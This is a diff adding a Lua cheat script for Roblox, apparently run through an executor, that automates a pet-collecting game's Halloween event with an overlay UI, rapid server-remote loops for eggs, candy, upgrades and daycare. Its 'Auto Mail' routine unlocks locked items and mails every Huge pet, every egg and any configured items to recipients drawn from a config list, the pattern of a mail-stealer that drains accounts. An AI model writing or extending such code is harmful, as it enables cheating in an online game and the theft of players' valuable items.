+    local statusContainer = Instance.new("Frame")
+    statusContainer.Name = "StatusContainer"
+    statusContainer.Size = UDim2.new(0, 600, 0, 80)
+    statusContainer.Position = UDim2.new(0.5, -300, 0.55, 0)
+    statusContainer.BackgroundTransparency = 1
+    statusContainer.Parent = mainFrame
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Name = "StatusLabel"
+    statusLabel.Size = UDim2.new(1, 0, 1, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Checking Place ID..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    statusLabel.TextSize = 32
+    statusLabel.Font = Enum.Font.GothamBold
+    statusLabel.TextTransparency = 1
+    statusLabel.TextStrokeTransparency = 0.3
+    statusLabel.TextStrokeColor3 = Color3.fromRGB(255, 100, 0)
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+    statusLabel.TextYAlignment = Enum.TextYAlignment.Center
+    statusLabel.Parent = statusContainer
+
+    -- Store status label globally for updates
+    getgenv().PhantomXStatusLabel = statusLabel
+
+    --==[ NEW: Feature Status Indicators ]==--
+    local featureContainer = Instance.new("Frame")
+    featureContainer.Name = "FeatureContainer"
+    featureContainer.Size = UDim2.new(0, 300, 0, 300)
+    featureContainer.Position = UDim2.new(0, 20, 1, -320)
+    featureContainer.BackgroundTransparency = 1
+    featureContainer.Parent = mainFrame
+
+    local featureLayout = Instance.new("UIListLayout")
+    featureLayout.FillDirection = Enum.FillDirection.Vertical
+    featureLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+    featureLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+    featureLayout.Padding = UDim.new(0, 8)
+    featureLayout.Parent = featureContainer
+
+    -- Function to create feature status labels with Halloween style borders
+    local function createFeatureLabel(featureName, isEnabled)
+        local featureFrame = Instance.new("Frame")
+        featureFrame.Name = featureName .. "Status"
+        featureFrame.Size = UDim2.new(0, 220, 0, 35)
+        featureFrame.BackgroundTransparency = 1
+        featureFrame.Parent = featureContainer
+
+        local featureBackground = Instance.new("Frame")
+        featureBackground.Name = "Background"
+        featureBackground.Size = UDim2.new(1, 0, 1, 0)
+        featureBackground.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+        featureBackground.BackgroundTransparency = 1
+        featureBackground.Parent = featureFrame
+
+        local featureCorner = Instance.new("UICorner")
+        featureCorner.CornerRadius = UDim.new(0, 8)
+        featureCorner.Parent = featureBackground
+
+        local featureBorder = Instance.new("UIStroke")
+        featureBorder.Color = Color3.fromRGB(255, 140, 0)
+        featureBorder.Thickness = 2
+        featureBorder.Transparency = 1
+        featureBorder.Parent = featureBackground
+
+        local statusIcon = Instance.new("TextLabel")
+        statusIcon.Name = "Icon"
+        statusIcon.Size = UDim2.new(0, 30, 1, 0)
+        statusIcon.Position = UDim2.new(0, 10, 0, 0)
+        statusIcon.BackgroundTransparency = 1
+        statusIcon.Text = isEnabled and "🎃" or "💀"
+        statusIcon.TextColor3 = isEnabled and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
+        statusIcon.TextSize = 18
+        statusIcon.Font = Enum.Font.GothamBold
+        statusIcon.TextTransparency = 1
+        statusIcon.TextXAlignment = Enum.TextXAlignment.Left
+        statusIcon.Parent = featureBackground
+
+        local statusText = Instance.new("TextLabel")
+        statusText.Name = "Text"
+        statusText.Size = UDim2.new(1, -50, 1, 0)
+        statusText.Position = UDim2.new(0, 45, 0, 0)
+        statusText.BackgroundTransparency = 1
+        statusText.Text = featureName .. (isEnabled and " Enabled" or " Disabled")
+        statusText.TextColor3 = Color3.fromRGB(220, 200, 230)
+        statusText.TextSize = 16
+        statusText.Font = Enum.Font.Gotham
+        statusText.TextXAlignment = Enum.TextXAlignment.Left
+        statusText.TextTransparency = 1
+        statusText.Parent = featureBackground
+
+        local textConstraint = Instance.new("UITextSizeConstraint")
+        textConstraint.MaxTextSize = 16
+        textConstraint.Parent = statusText
+
+        return featureFrame
+    end
+
+    -- Create feature status labels based on config
+    local autoMailStatus = createFeatureLabel("Auto Mail", getgenv().PhantomXConfig.AutoMail and getgenv().PhantomXConfig.AutoMail.Enabled)
+    local fastFarmStatus = createFeatureLabel("Fast Farm", getgenv().PhantomXConfig.FastFarmEnabled)
+    local autoDaycareStatus = createFeatureLabel("Auto Daycare", getgenv().PhantomXConfig.AutoDaycare)
+    local autoClaimStatus = createFeatureLabel("Auto Claim Mail", getgenv().PhantomXConfig.AutoClaimMailbox)
+    local autoToysStatus = createFeatureLabel("Auto Use Toys", getgenv().PhantomXConfig.AutoUseToys)
+    local autoFruitsStatus = createFeatureLabel("Auto Eat Fruits", getgenv().PhantomXConfig.AutoEatFruits)
+    
+    -- New Halloween Feature Status Labels
+    local autoJoinEventStatus = createFeatureLabel("Auto Join Event", getgenv().PhantomXConfig.AutoJoinEvent)
+    local eggLuckStatus = createFeatureLabel("Egg Luck Upgrade", getgenv().PhantomXConfig.EggLuckUpgrade)
+    local witchHatsStatus = createFeatureLabel("Witch Hats Upgrade", getgenv().PhantomXConfig.MoreWitchHatsUpgrade)
+    local halloweenCandyStatus = createFeatureLabel("Halloween Candy Upgrade", getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade)
+    local autoFarmHatsStatus = createFeatureLabel("Auto Farm Hats", getgenv().PhantomXConfig.AutoFarmHats)
+    local autoCollectCandyStatus = createFeatureLabel("Auto Collect Candy", getgenv().PhantomXConfig.AutoCollectCandy)
+
+    --==[ NEW: FPS Counter ]==--
+    local fpsContainer = Instance.new("Frame")
+    fpsContainer.Name = "FPSContainer"
+    fpsContainer.Size = UDim2.new(0, 120, 0, 40)
+    fpsContainer.Position = UDim2.new(1, -140, 0, 20)
+    fpsContainer.BackgroundTransparency = 1
+    fpsContainer.Parent = mainFrame
+
+    local fpsFrame = Instance.new("Frame")
+    fpsFrame.Name = "FPSFrame"
+    fpsFrame.Size = UDim2.new(1, 0, 1, 0)
+    fpsFrame.BackgroundColor3 = Color3.fromRGB(25, 15, 30)
+    fpsFrame.BorderSizePixel = 0
+    fpsFrame.BackgroundTransparency = 1
+    fpsFrame.Parent = fpsContainer
+
+    local fpsCorner = Instance.new("UICorner")
+    fpsCorner.CornerRadius = UDim.new(0, 8)
+    fpsCorner.Parent = fpsFrame
+
+    local fpsBorder = Instance.new("UIStroke")
+    fpsBorder.Color = Color3.fromRGB(255, 140, 0)
+    fpsBorder.Thickness = 2
+    fpsBorder.Transparency = 1
+    fpsBorder.Parent = fpsFrame
+
+    local fpsLabel = Instance.new("TextLabel")
+    fpsLabel.Name = "FPSLabel"
+    fpsLabel.Size = UDim2.new(1, -10, 1, 0)
+    fpsLabel.Position = UDim2.new(0, 5, 0, 0)
+    fpsLabel.BackgroundTransparency = 1
+    fpsLabel.Text = "FPS: 0"
+    fpsLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
+    fpsLabel.TextSize = 18
+    fpsLabel.Font = Enum.Font.GothamBold
+    fpsLabel.TextTransparency = 1
+    fpsLabel.TextStrokeTransparency = 1
+    fpsLabel.TextStrokeColor3 = Color3.fromRGB(150, 50, 200)
+    fpsLabel.Parent = fpsFrame
+
+    --==[ NEW: Real-time Data Updaters ]==--
+    local function updateDiamonds()
+        while wait(1) do
+            pcall(function()
+                local diamondsTextLabel = player.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+                if diamondsTextLabel and diamondsLabel then
+                    diamondsLabel.Text = diamondsTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    local function updateRank()
+        while wait(1) do
+            pcall(function()
+                local rankTextLabel = player.PlayerGui.Rank.Frame.Side.RankNum
+                if rankTextLabel and rankValue then
+                    rankValue.Text = rankTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ NEW: Candy Counter Updater ]==--
+    local function updateCandy()
+        while wait(0.5) do
+            pcall(function()
+                local candyTextLabel = player.PlayerGui.MainLeft.Left.Currency.HalloweenCoins["Halloween Candy"].Amount
+                if candyTextLabel and candyLabel then
+                    candyLabel.Text = candyTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ NEW: Hats Counter Updater ]==--
+    local function updateHats()
+        while wait(0.5) do
+            pcall(function()
+                local hatsTextLabel = player.PlayerGui._MACHINES.HalloweenUpgradeMachine.Frame.ItemsFrame.Items.Tickets.CostFrame.Amount
+                if hatsTextLabel and hatsLabel then
+                    hatsLabel.Text = hatsTextLabel.Text
+                end
+            end)
+        end
+    end
+
+    --==[ WEBHOOK-BASED COUNTER SYSTEM ]==--
+    local initialEggCount = 0
+
+    -- Initialize counts
+    local function initializeCounts()
+        task.wait(3)
+        pcall(function()
+            local SaveModule = require(Client.Save)
+            local currentSave = SaveModule.Get()
+            initialEggCount = currentSave.EggsHatched or 0
+            
+            if hugesLabel then
+                hugesLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.HugesGained)
+            end
+            if titanicsLabel then
+                titanicsLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.TitanicsGained)
+            end
+        end)
+    end
+
+    -- Update counts in real-time
+    local function updateCounts()
+        while wait(0.5) do
+            pcall(function()
+                -- Update UI labels using webhook-tracked stats
+                if hugesLabel then
+                    hugesLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.HugesGained)
+                end
+                if titanicsLabel then
+                    titanicsLabel.Text = string.format("+%d", getgenv().PhantomXSessionStats.TitanicsGained)
+                end
+            end)
+        end
+    end
+
+    -- FPS Counter Update Function
+    local function updateFPSCounter()
+        local frames = 0
+        local lastUpdate = tick()
+        
+        RunService.Heartbeat:Connect(function()
+            frames = frames + 1
+            local currentTime = tick()
+            
+            if currentTime - lastUpdate >= 1 then
+                local fps = math.floor(frames / (currentTime - lastUpdate))
+                fpsLabel.Text = "FPS: " .. fps
+                frames = 0
+                lastUpdate = currentTime
+            end
+        end)
+    end
+
+    -- Animation functions
+    local function animateGradient()
+        local rotation = 0
+        while wait(0.05) do
+            rotation = rotation + 1
+            if rotation > 360 then rotation = 0 end
+            gradient.Rotation = rotation
+            glowGradient.Rotation = -rotation
+        end
+    end
+
+    local function pulseGlow()
+        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+        local goal = {BackgroundTransparency = 0.92}
+        local tween = TweenService:Create(glowOverlay, tweenInfo, goal)
+        tween:Play()
+    end
+
+    -- Uptime counter
+    local startTime = tick()
+    local function updateUptime()
+        while wait(1) do
+            local elapsed = tick() - startTime
+            local hours = math.floor(elapsed / 3600)
+            local minutes = math.floor((elapsed % 3600) / 60)
+            local seconds = math.floor(elapsed % 60)
+
+            if uptimeLabel then
+                uptimeLabel.Text = string.format("%02d:%02d:%02d", hours, minutes, seconds)
+            end
+        end
+    end
+
+    -- Auto-scale based on screen size
+    local function updateScale()
+        local viewportSize = workspace.CurrentCamera.ViewportSize
+        local baseWidth = 1920
+        local baseHeight = 1080
+        local scaleX = viewportSize.X / baseWidth
+        local scaleY = viewportSize.Y / baseHeight
+        local scale = math.min(scaleX, scaleY, 1.2)
+
+        titleScale.Scale = scale
+        rankScale.Scale = scale
+        statsScale.Scale = scale
+    end
+
+    workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
+
+    -- SmoothFade In Intro Animation
+    local function playIntroAnimation()
+        -- Fade in background
+        local bgFadeIn = TweenService:Create(mainFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+        bgFadeIn:Play()
+
+        wait(0.5)
+
+        -- Fade in intro text
+        local introTextFade = TweenService:Create(introText, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.3
+        })
+        introTextFade:Play()
+
+        wait(2.5)
+
+        -- Fade out intro text
+        local introTextFadeOut = TweenService:Create(introText, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 1,
+            TextStrokeTransparency = 1
+        })
+        introTextFadeOut:Play()
+
+        wait(1)
+        introContainer:Destroy()
+
+        -- Calculate proper scale
+        updateScale()
+
+        -- Fade in title
+        local titleFade = TweenService:Create(titleLabel, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.5
+        })
+        titleFade:Play()
+
+        wait(0.3)
+
+        -- Fade in rank frame
+        local rankTransparencyTween = TweenService:Create(rankFrame, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        rankTransparencyTween:Play()
+
+        local rankBlurTween = TweenService:Create(rankBlur, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0.3
+        })
+        rankBlurTween:Play()
+
+        local rankBorderTween = TweenService:Create(rankBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
+        })
+        rankBorderTween:Play()
+
+        -- Fade in rank text
+        local rankValueFade = TweenService:Create(rankValue, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.8
+        })
+        rankValueFade:Play()
+
+        wait(0.3)
+
+        -- Fade in stats frame background
+        local statsTransparencyTween = TweenService:Create(statsFrame, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        statsTransparencyTween:Play()
+
+        local statsBlurTween = TweenService:Create(statsBlur, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0.3
+        })
+        statsBlurTween:Play()
+
+        local statsBorderTween = TweenService:Create(statsBorder, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
+        })
+        statsBorderTween:Play()
+
+        -- Fade in all stat text
+        for _, statBox in pairs(statsList:GetChildren()) do
+            if statBox:IsA("Frame") then
+                for _, child in pairs(statBox:GetChildren()) do
+                    if child:IsA("TextLabel") then
+                        spawn(function()
+                            local textFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                                TextTransparency = 0,
+                                TextStrokeTransparency = 0.8
+                            })
+                            textFade:Play()
+                        end)
+                    elseif child:IsA("Frame") and child.Name == "Divider" then
+                        spawn(function()
+                            local dividerFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                                BackgroundTransparency = 0.5
+                            })
+                            dividerFade:Play()
+                        end)
+                    end
+                end
+            end
+        end
+
+        wait(0.5)
+
+        -- Fade in status label
+        local statusFade = TweenService:Create(statusLabel, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.3
+        })
+        statusFade:Play()
+
+        -- Fade in feature status indicators with borders
+        wait(0.8)
+        for _, featureFrame in pairs(featureContainer:GetChildren()) do
+            if featureFrame:IsA("Frame") then
+                local background = featureFrame:FindFirstChild("Background")
+                if background then
+                    local backgroundFade = TweenService:Create(background, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                        BackgroundTransparency = 0
+                    })
+                    backgroundFade:Play()
+
+                    local borderFade = TweenService:Create(background.UIStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                        Transparency = 0.3
+                    })
+                    borderFade:Play()
+
+                    for _, child in pairs(background:GetChildren()) do
+                        if child:IsA("TextLabel") then
+                            local textFade = TweenService:Create(child, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+                                TextTransparency = 0
+                            })
+                            textFade:Play()
+                        end
+                    end
+                end
+            end
+        end
+
+        -- Fade in FPS counter
+        wait(0.3)
+        local fpsFrameFade = TweenService:Create(fpsFrame, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            BackgroundTransparency = 0
+        })
+        fpsFrameFade:Play()
+
+        local fpsBorderFade = TweenService:Create(fpsBorder, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            Transparency = 0.3
+        })
+        fpsBorderFade:Play()
+
+        local fpsTextFade = TweenService:Create(fpsLabel, TweenInfo.new(0.8, Enum.EasingStyle.Sine), {
+            TextTransparency = 0,
+            TextStrokeTransparency = 0.8
+        })
+        fpsTextFade:Play()
+
+        -- Fade in Halloween decorations
+        wait(0.5)
+        for _, child in pairs(mainFrame:GetChildren()) do
+            if child.Name == "SpiderWeb" or child.Name == "Pumpkin" then
+                local decorationFade = TweenService:Create(child, TweenInfo.new(1, Enum.EasingStyle.Sine), {
+                    ImageTransparency = child.Name == "SpiderWeb" and 0.3 or 0.5
+                })
+                decorationFade:Play()
+            end
+        end
+
+        -- Start glow animation
+        wait(1)
+        local glowFadeIn = TweenService:Create(glowOverlay, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {BackgroundTransparency = 0.95})
+        glowFadeIn:Play()
+    end
+
+    -- Start animations and intro
+    spawn(animateGradient)
+    spawn(playIntroAnimation)
+    spawn(updateUptime)
+    spawn(updateFPSCounter)
+    spawn(updateDiamonds)
+    spawn(updateRank)
+    spawn(updateCandy)
+    spawn(updateHats)
+    spawn(initializeCounts)
+    spawn(updateCounts)
+    wait(5)
+    spawn(pulseGlow)
+
+    --==[ FULL ORIGINAL UI SCRIPT END ]==--
+end
+
+local function RunFastFarm()
+    -- Wait for game to load
+    repeat task.wait() until game:IsLoaded()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TeleportService = game:GetService("TeleportService")
+    local RunService = game:GetService("RunService")
+    
+    repeat task.wait() until not LocalPlayer.PlayerGui:FindFirstChild("__INTRO")
+    repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    
+    -- Load libraries
+    local Library = ReplicatedStorage.Library
+    local Client = Library.Client
+    local Save = require(Client.Save).Get().Inventory
+    local Network = require(Library.Client.Network)
+    
+    --==[ PLACE ID CHECK AND TELEPORT ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoJoinEvent then
+        local targetPlaceId = getgenv().PhantomXConfig.TargetPlaceId or 131952481663528
+        
+        if game.PlaceId ~= targetPlaceId then
+            updateStatusLabel("Joining Halloween Event...")
+            print("[PhantomX] Not in target place, teleporting to Halloween event...")
+            TeleportService:Teleport(targetPlaceId, LocalPlayer)
+            return
+        else
+            updateStatusLabel("In Halloween Event - Script Ready")
+            print("[PhantomX] Already in Halloween event place, continuing...")
+        end
+    end
+    
+    --==[ FPS CAP SYSTEM ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.FPSCap then
+        setfpscap(getgenv().PhantomXConfig.FPSCap)
+        task.spawn(function()
+            while true do
+                if getgenv().PhantomXConfig and getgenv().PhantomXConfig.FPSCap then
+                    setfpscap(getgenv().PhantomXConfig.FPSCap)
+                end
+                task.wait(10)
+            end
+        end)
+    end
+    
+    --==[ FIND PLAYER BASE ]==--
+    local playerBaseNumber = nil
+    
+    local function findPlayerBase()
+        updateStatusLabel("Searching for base...")
+        
+        -- Wait for things to load
+        task.wait(0.5)
+        
+        local plotsFolder = workspace:FindFirstChild("__THINGS")
+        if not plotsFolder then
+            updateStatusLabel("ERROR - No __THINGS folder")
+            return nil
+        end
+        
+        local plots = plotsFolder:FindFirstChild("Plots")
+        if not plots then
+            updateStatusLabel("ERROR - No Plots folder")
+            return nil
+        end
+        
+        local playerName = LocalPlayer.Name
+        print("[PhantomX] Searching for base owned by: " .. playerName)
+        
+        -- Check all plots
+        for _, plot in pairs(plots:GetChildren()) do
+            print("[PhantomX] Checking plot: " .. plot.Name)
+            
+            -- Use a safer approach to navigate the hierarchy
+            local success, result = pcall(function()
+                local titleText = plot.Build.Base.Attachment.BillboardGui.Title.Text
+                return titleText
+            end)
+            
+            if success then
+                print("[PhantomX] Found title: " .. result)
+                if string.find(result, playerName) then
+                    local baseNum = tonumber(plot.Name)
+                    updateStatusLabel("Found base #" .. baseNum)
+                    print("[PhantomX] SUCCESS: Found player base at plot #" .. baseNum)
+                    return baseNum
+                end
+            else
+                print("[PhantomX] Could not access plot " .. plot.Name .. ": " .. tostring(result))
+            end
+        end
+        
+        updateStatusLabel("Base not found")
+        print("[PhantomX] ERROR: Could not find player's base")
+        return nil
+    end
+    
+    -- Find player's base on script start
+    spawn(function()
+        playerBaseNumber = findPlayerBase()
+    end)
+    
+    --==[ AUTO FARM HATS ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoFarmHats then
+        task.spawn(function()
+            local hatConnection
+            hatConnection = RunService.Heartbeat:Connect(function()
+                if playerBaseNumber then
+                    pcall(function()
+                        updateStatusLabel("Farming hats at base #" .. playerBaseNumber)
+                        local args = {
+                            playerBaseNumber,  -- Use the found base number
+                            "PurchaseEgg",
+                            2,
+                            1
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Plots_Invoke"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.EggsOpened = getgenv().PhantomXSessionStats.EggsOpened + 1
+                    end)
+                else
+                    -- Try to find base again if not found
+                    playerBaseNumber = findPlayerBase()
+                end
+                task.wait(0.1) -- Wait 0.1 seconds between executions
+            end)
+        end)
+    end
+    
+    --==[ AUTO COLLECT CANDY ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoCollectCandy then
+        task.spawn(function()
+            while true do
+                if getgenv().PhantomXConfig.AutoCollectCandy then
+                    pcall(function()
+                        updateStatusLabel("Collecting candy...")
+                        for i = 1, 10 do
+                            local args = {i}
+                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("HalloweenWorld_Claim"):InvokeServer(unpack(args))
+                            getgenv().PhantomXSessionStats.CandyCollected = getgenv().PhantomXSessionStats.CandyCollected + 1
+                            task.wait(0.01)
+                        end
+                    end)
+                end
+                task.wait(0.1) -- Small delay before next cycle
+            end
+        end)
+    end
+    
+    --==[ UPGRADE SYSTEMS (RUN EVERY 1 SECOND) ]==--
+    
+    -- Egg Luck Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.EggLuckUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.EggLuckUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Egg Luck...")
+                        local args = {"HalloweenEggLuck"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    -- More Witch Hats Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.MoreWitchHatsUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.MoreWitchHatsUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Witch Hats...")
+                        local args = {"HalloweenMoreWitchHats"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    -- More Halloween Candy Upgrade
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade then
+        task.spawn(function()
+            while task.wait(1) do
+                if getgenv().PhantomXConfig.MoreHalloweenCandyUpgrade then
+                    pcall(function()
+                        updateStatusLabel("Upgrading Halloween Candy...")
+                        local args = {"HalloweenCandyMultiplier"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("EventUpgrades: Purchase"):InvokeServer(unpack(args))
+                        getgenv().PhantomXSessionStats.UpgradesPurchased = getgenv().PhantomXSessionStats.UpgradesPurchased + 1
+                    end)
+                end
+            end
+        end)
+    end
+    
+    --==[ AUTO MAIL SYSTEM ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoMail and getgenv().PhantomXConfig.AutoMail.Enabled then
+        local function getMailCost()
+            local Constants = require(ReplicatedStorage.Library.Balancing.Constants)
+            local MailboxTypes = require(ReplicatedStorage.Library.Types.Mailbox)
+            local currentSave = require(ReplicatedStorage.Library.Client.Save).Get()
+            
+            local baseCost = Constants.MailboxDiamondCost
+            local growthRate = MailboxTypes.DiamondCostGrowthRate
+            local sends = currentSave.MailboxSendsSinceReset or 0 
+            return baseCost * math.pow(growthRate, sends)
+        end
+
+        local function parseItemName(itemName, itemClass)
+            local parsed = {
+                baseName = itemName,
+                tn = nil,
+                sh = nil,
+            }
+            
+            if itemClass == "Pet" then
+                local workingName = itemName
+                
+                if workingName:find("Shiny") then
+                    parsed.sh = true
+                    workingName = workingName:gsub("Shiny ", ""):gsub(" Shiny", "")
+                end
+                
+                if workingName:find("Rainbow") then
+                    parsed.tn = 2
+                    workingName = workingName:gsub("Rainbow ", ""):gsub(" Rainbow", "")
+                elseif workingName:find("Gold") then
+                    parsed.tn = 1
+                    workingName = workingName:gsub("Gold ", ""):gsub(" Gold", "")
+                end
+                
+                parsed.baseName = workingName:gsub("^%s+", ""):gsub("%s+$", ""):gsub("%s+", " ")
+                
+            elseif itemClass ~= "Pet" then
+                local enchantName, tier = itemName:match("^(.+)%s+(%d+)$")
+                if enchantName and tier then
+                    parsed.baseName = enchantName:gsub("^%s+", ""):gsub("%s+$", "")
+                    parsed.tn = tonumber(tier)
+                else
+                    parsed.baseName = itemName
+                end
+            end
+            
+            return parsed
+        end
+
+        task.spawn(function()
+            while task.wait(getgenv().PhantomXConfig.AutoMail['Loop Interval'] or 60) do
+                pcall(function()
+                    local Queue = {}
+                    
+                    local currentSave = require(Client.Save).Get()
+                    if not currentSave or not currentSave.Inventory then 
+                        return 
+                    end
+                    
+                    for Class, Items in pairs(currentSave.Inventory) do
+                        for uid, v in pairs(Items) do
+                            local PetCheck = (Class == "Pet") and string.find(v.id, "Huge")
+                            local Config = false
+                            
+                            for configItemName, Info in pairs(getgenv().PhantomXConfig.AutoMail['Items']) do
+                                if Info.Class == Class then
+                                    local parsed = parseItemName(configItemName, Info.Class)
+                                    
+                                    local nameMatch = (parsed.baseName == v.id)
+                                    local tierMatch = (parsed.tn == nil or parsed.tn == v.tn)
+                                    local shinyMatch = (parsed.sh == nil or parsed.sh == v.sh)
+                                    local amountMatch = ((Info.Amount or 0) <= (v._am or 1))
+                                    
+                                    if nameMatch and tierMatch and shinyMatch and amountMatch then
+                                        Config = true
+                                        break
+                                    end
+                                end
+                            end
+                            
+                            if Class == "Egg" or Config or PetCheck then
+                                if not Queue[uid] then
+                                    Queue[uid] = { Class = Class, Info = v }
+                                end
+                            end
+                        end
+                    end
+                    
+                    for uid, Data in pairs(Queue) do
+                        local v = Data.Info
+                        
+                        if v._lk then
+                            while not Network.Invoke("Locking_SetLocked", uid, false) do
+                                task.wait(0.1)
+                            end
+                        end
+                        
+                        local SendAmount = (v._am or 1)
+                        if Data.Class == "Currency" then
+                            local mailCost = getMailCost()
+                            SendAmount = SendAmount - mailCost
+                        end
+                        
+                        local recipient = getgenv().PhantomXConfig.AutoMail['Users'][math.random(1, #getgenv().PhantomXConfig.AutoMail['Users'])]
+                        
+                        pcall(function()
+                            Network.Invoke("Mailbox: Send", 
+                                recipient, 
+                                "Bless", 
+                                Data.Class, 
+                                uid, 
+                                SendAmount
+                            )
+                        end)
+                        
+                        task.wait(3)
+                    end
+                end)
+            end
+        end)
+    end
+    
+    --==[ AUTO DAYCARE SYSTEM ]==--
+    if getgenv().PhantomXConfig and getgenv().PhantomXConfig.AutoDaycare then
+        task.spawn(function()
+            local DaycareCmds
+            if not pcall(function() DaycareCmds = require(ReplicatedStorage.Library.Client.DaycareCmds) end) then return end
+            local PetCmds
+            if not pcall(function() PetCmds = require(ReplicatedStorage.Library.Client.PetCmds) end) then return end
+            
+            while true do
+                local activePets = DaycareCmds.GetActive(LocalPlayer)
+                local longestWaitGameSeconds = 0
+                if next(activePets) then
+                    for slotId, petData in pairs(activePets) do
+                        local remainingTime = DaycareCmds.ComputeRemainingTime(slotId, nil, LocalPlayer)
+                        if type(remainingTime) ~= "number" then remainingTime = 0 end
+                        if remainingTime > 0 then longestWaitGameSeconds = math.max(longestWaitGameSeconds, remainingTime) end
+                    end
+                    if longestWaitGameSeconds > 0 then task.wait(longestWaitGameSeconds / 3 + 5) end
+                end
+                activePets = DaycareCmds.GetActive(LocalPlayer)
+                if next(activePets) then
+                    for slotId, _ in pairs(activePets) do
+                        if DaycareCmds.ComputeRemainingTime(slotId, nil, LocalPlayer) <= 0 then
+                            pcall(function() DaycareCmds.Claim(slotId) end)
+                            task.wait(0.1)
+                        end
+                    end
+                end
+                local currentMaxSlots = DaycareCmds.GetMaxSlots()
+                if currentMaxSlots < 30 then
+                    local vouchersNeeded = 30 - currentMaxSlots
+                    local currentSave = require(Client.Save).Get()
+                    local vouchersAvailable = 0
+                    if currentSave and currentSave.Inventory and currentSave.Inventory.Misc then
+                        for _, item in pairs(currentSave.Inventory.Misc) do
+                            if item.id == "Daycare Slot Voucher" then vouchersAvailable = item._am or 1; break end
+                        end
+                    end
+                    if vouchersAvailable > 0 then
+                        local vouchersToConsume = math.min(vouchersNeeded, vouchersAvailable)
+                        for i = 1, vouchersToConsume do
+                            pcall(function() Network.Invoke("DaycareSlotVoucher_Consume") end)
+                            task.wait(0.05)
+                        end
+                    end
+                end
+                local availableSlots = DaycareCmds.GetMaxSlots() - DaycareCmds.GetUsedSlots(LocalPlayer)
+                if availableSlots > 0 then
+                    local currentSave = require(Client.Save).Get()
+                    if currentSave and currentSave.Inventory and currentSave.Inventory.Pet then
+                        local equippedUIDs, daycareUIDs, candidatePets = {}, {}, {}
+                        pcall(function()
